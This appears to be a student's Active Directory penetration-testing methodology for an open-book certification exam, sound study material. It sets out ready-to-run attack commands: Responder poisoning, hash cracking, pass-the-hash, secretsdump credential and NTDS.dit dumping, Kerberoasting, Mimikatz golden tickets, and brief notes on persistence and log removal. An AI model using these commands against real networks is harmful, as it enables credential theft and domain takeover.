---

# 🛡️ Active Directory Attack Methodology: Enhanced Enumeration and Prioritization

This methodology focuses on account enumeration and attack path prioritization, using commands and techniques directly from your notes. This guide will help streamline the process and provide quick reference points for an open-book exam.

---

## 🔍 Phase 1: Reconnaissance and Initial Access

### 1. **Network Scanning and Vulnerability Identification**

- **🖥️ Identify Live Hosts and Open Ports:**
    - **Command:** `nmap -T4 -A -p- <target_IP_range>`
        - **📝 Note:** Adjust the `T` flag for scan speed and stealth if needed.
- **🔐 Check for SMB Signing:**
    - **Command:** `nmap --script=smb2-security-mode.nse -p445 <target_IP>`
        - **💡 Look For:** "Message signing enabled but not required" to identify vulnerable hosts.
- **🗝️ Scan for Default Credentials:** Access services' web interfaces via their IP addresses and attempt default logins (e.g., `admin:admin` for HP printers).

### ✔️ **Checklist**:

- [ ]  Run Nmap scan
- [ ]  Check for SMB signing
- [ ]  Attempt default credentials on identified services

---

## 🎣 Phase 2: Launch Responder to Capture Traffic

- **Enable LLMNR/NBT-NS Poisoning:**
    - **Command:** `sudo responder -I <interface> -wPv`
        - **⚠️ Replace `<interface>`** with your network interface (e.g., `eth0`).
- **📶 Generate Network Traffic (If Necessary):** Induce traffic by accessing an invalid file share (e.g., `\\\\<attacker_IP>\\invalid_share`).
- **🔍 Analyze Responder Output:** Look for NTLMv2 hashes and save them to `hashes.txt`.

### ✔️ **Checklist**:

- [ ]  Run Responder
- [ ]  Induce traffic if no response
- [ ]  Save captured hashes

---

## 🛠️ Phase 3: Enhanced Enumeration and Prioritization

### 1. **Account Enumeration and Information Gathering**

- **📝 Use `ldapdomaindump` for Rapid Enumeration:**
    - **Command:** `sudo /usr/bin/ldapdomaindump ldaps://<DC_IP> -u 'MARVEL\\\\<username>' -p <password>`
    - **Prioritize:**
        - **`domain_users_by_group.html`:** Identify high-privilege users (e.g., Domain Admins).
        - **Accounts with `DONT_EXPIRE_PASSWD` Flag:** Valuable for long-term access.
- **🔎 Deep Dive with BloodHound:** For detailed Active Directory analysis.
    - **Steps:** Follow source instructions for `bloodhound-python`.
    - **Prioritize:**
        - "Find All Domain Admins" to identify potential attack paths.
        - "Kerberos Interaction" to identify Kerberoastable users.
- **⚡ Quick Assessment with PlumHound:** Use for a rapid overview of users and vulnerabilities.
    - **Commands:** Use the `-easy` flag for quick queries and `x` for full execution.
    - **Prioritize:**
        - **"Domain Admins (Direct)"** for direct access points.
        - **"Kerberoastable Users"** for potential Kerberoasting attacks.

### ✔️ **Checklist**:

- [ ]  Run `ldapdomaindump`
- [ ]  Use BloodHound for deep analysis
- [ ]  Perform quick assessment with PlumHound

### 📌 **Common Flags Explained**:

- **`u` and `p` in `ldapdomaindump`:** Specify username and password for domain connection.
- **`-easy` in PlumHound:** Run predefined quick queries.

---

## 🚀 Phase 4: Privilege Escalation and Lateral Movement

### 1. **Crack Captured Hashes (Optional but Recommended)**

- **🧩 Use Hashcat:** Attempt to crack NTLMv2 hashes.
    - **Command:** `hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force --show`

### 2. **Pass-the-Hash and Pass-the-Password Attacks**

- **🔑 CrackMapExec for Pass-the-Hash:** Test captured hashes.
    - **Command:** `crackmapexec smb <target_IP_range> -u <username> -H "<hash>" --local-auth`
    - **💡 Look For:** "Pwn3d!" to confirm successful authentication.
- **🔑 CrackMapExec for Pass-the-Password:** Test cracked passwords.
    - **Command:** `crackmapexec <target_IP_range> -u <username> -d <domain> -p <password>`

### 3. **Dump Credentials from Compromised Systems**

- **🔓 Use `secretsdump.py`:** Extract credentials.
    - **Command:** `secretsdump.py <domain>/<username>:<password>@<target_IP>`
- **💡 Target:** Domain Controllers for valuable credentials.

### 4. **Kerberoasting and Token Impersonation**

- **🧾 Use Impacket's `GetUserSPNs.py`:** Enumerate service accounts.
    - **Command:** `sudo GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DC_IP>`
- **🧩 Crack Tickets:** Use Hashcat with mode 13100.
    - **Command:** `hashcat -m 13100 <ticket_file.txt> /usr/share/wordlists/rockyou.txt`
- **🎟️ Token Impersonation:** Use Metasploit's `incognito` module if a high-privilege token is found.
    - **Command:** `meterpreter > impersonate_token <domain>\\<username>`

### ✔️ **Checklist**:

- [ ]  Crack hashes with Hashcat
- [ ]  Perform Pass-the-Hash and Pass-the-Password attacks
- [ ]  Dump credentials using `secretsdump.py`
- [ ]  Enumerate service accounts with `GetUserSPNs.py`
- [ ]  Crack Kerberos tickets
- [ ]  Attempt token impersonation

---

## 🏴 Phase 5: Domain Controller Compromise

### 1. **Dump the NTDS.dit**

- **🔓 Use `secretsdump.py`:** Extract NTLM hashes.
    - **Command:** `secretsdump.py <domain>/<username>:<password>@<DC_IP>`

### 2. **Extract NTLM Hashes and Perform Golden Ticket Attacks**

- **💾 Extract NTLM Hashes:** Use `just-dc-ntlm` flag.
    - **Command:** `secretsdump.py <domain>/<username>:<password>@<DC_IP> -just-dc-ntlm`
- **🧩 Crack NTLM Hashes:** Use Hashcat (`m 1000`).
    - **Command:** `hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt`
- **🎟️ Golden Ticket Attack:** If krbtgt is compromised, use Mimikatz.
    - **Command:** `mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:500 /ptt`

### ✔️ **Checklist**:

- [ ]  Dump NTDS.dit using `secretsdump.py`
- [ ]  Extract and crack NTLM hashes
- [ ]  Attempt Golden Ticket attack with Mimikatz

---

## 🛡️ Phase 6: Persistence, Clean Up, and Adaptation

### 1. **Establish Persistence (Consider Risks)**

- **🛠️ Focus:** Use potential methods like creating new admin accounts if ethically permissible.

### 2. **Cover Your Tracks**

- **🗑️ Remove Traces:** Understand the importance of log removal in real-world scenarios.

### 3. **Adapting Your Strategy**

- **🛠️ Refine:** Use information from `ldapdomaindump`, BloodHound, and other tools to adjust your strategy.
- **🎯 Exploit Weaknesses:** Pivot to other attack methods if current paths are blocked.

### ✔️ **Checklist**:

- [ ]  Consider persistence methods
- [ ]  Clean up traces if applicable
- [ ]  Adjust strategy based on findings

---

## 📌 Essential Considerations for Exam Success

- **🎯 Focus:** Concentrate on the specific commands and techniques.
- **⏱️ Time Management:** Practice the steps to optimize efficiency.
- **🧩 Understand Outputs:** Be prepared to analyze outputs from tools like Responder, CrackMapExec, and Hashcat.

---